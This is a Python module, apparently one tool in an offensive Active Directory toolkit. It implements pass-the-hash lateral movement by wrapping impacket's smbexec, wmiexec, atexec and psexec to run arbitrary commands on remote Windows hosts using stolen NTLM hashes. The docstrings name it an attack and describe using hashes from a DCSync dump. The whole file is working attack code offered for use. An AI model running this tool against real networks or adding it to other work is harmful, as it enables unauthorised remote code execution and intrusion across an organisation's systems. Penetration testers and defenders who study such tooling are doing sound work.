"""
Pass-the-Hash — authenticate to remote systems using NTLM hashes.

Uses impacket's execution scripts (smbexec, wmiexec, atexec, psexec) to
execute commands on remote targets using NTLM password hashes instead of
cleartext passwords. This enables lateral movement when only hashes are
available (e.g. from a DCSync dump).
"""

import asyncio
import logging
import shutil
import sys
from typing import Any

from impacket.examples import logger as impacket_logger

logging.getLogger("impacket").setLevel(logging.ERROR)
impacket_logger.init(ts=False, debug=False)

_EXEC_SCRIPTS = {
    "smbexec": "smbexec.py",
    "wmiexec": "wmiexec.py",
    "atexec": "atexec.py",
    "psexec":  "psexec.py",
}


def _find_script(name: str) -> str | None:
    """Locate an impacket script in the venv's bin directory."""
    path = shutil.which(name)
    if path:
        return path
    venv_bin = sys.prefix + "/bin"
    return f"{venv_bin}/{name}"


async def ad_passthehash(
    target: str,
    username: str,
    nt_hash: str,
    domain: str = "",
    lm_hash: str = "",
    command: str = "",
    protocol: str = "smbexec",
) -> dict:
    """Execute a command on a remote target using NTLM hash authentication.

    Authenticates to the remote host using the supplied NTLM (and optional
    LM) hash — a "pass-the-hash" attack — and runs *command* via one of
    four execution protocols:

    - **smbexec** — creates a service via SVCCTL, writes output to an SMB
      share. Semi-interactive shell; command is piped via stdin.
    - **wmiexec** — uses WMI (Win32_Process) via DCOM.
    - **atexec** — uses the Task Scheduler (ATSVC) for one-shot execution.
    - **psexec** — uploads a temporary service binary via SMB.

    Args:
        target:   IP address or hostname of the remote target.
        username: Account name for authentication.
        nt_hash:  NT hash (NTLM hash) for authentication.
        domain:   Windows domain name (optional).
        lm_hash:  LM hash (optional, most modern systems use NT hash only).
        command:  Command to execute on the remote target.
        protocol: Execution protocol — ``"smbexec"`` (default),
                  ``"wmiexec"``, ``"atexec"``, or ``"psexec"``.

    Returns:
        A dict with target, username, domain, protocol, command, executed,
        output, and error fields.
    """
    result: dict[str, Any] = {
        "target": target,
        "username": username,
        "domain": domain,
        "protocol": protocol,
        "command": command,
        "executed": False,
        "output": "",
        "error": None,
    }

    if protocol not in _EXEC_SCRIPTS:
        result["error"] = (
            f"Unsupported protocol: '{protocol}'. "
            f"Must be one of: {', '.join(sorted(_EXEC_SCRIPTS))}."
        )
        return result

    if not command:
        result["error"] = "No command provided to execute."
        return result

    script_name = _EXEC_SCRIPTS[protocol]
    script_path = _find_script(script_name)
    if not script_path:
        result["error"] = f"Could not find impacket script: {script_name}"
        return result

    hashes = f"{lm_hash}:{nt_hash}"
    target_spec = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"

    cmd_args = [
        "python3",
        script_path,
        "-hashes", hashes,
        "-no-pass",
        target_spec,
    ]

    if protocol == "smbexec":
        pass
    else:
        cmd_args.append(command)

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd_args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            stdin=asyncio.subprocess.PIPE if protocol == "smbexec" else None,
        )

        if protocol == "smbexec":
            stdout_bytes, stderr_bytes = await proc.communicate(
                input=f"{command}\nexit\n".encode()
            )
        else:
            stdout_bytes, stderr_bytes = await proc.communicate()

        output = stdout_bytes.decode("utf-8", errors="replace")
        stderr = stderr_bytes.decode("utf-8", errors="replace")

        result["output"] = output.strip()
        result["executed"] = proc.returncode == 0

        if proc.returncode != 0 and stderr:
            result["error"] = stderr.strip() or f"Exit code: {proc.returncode}"

    except Exception as exc:
        result["error"] = str(exc)

    return result
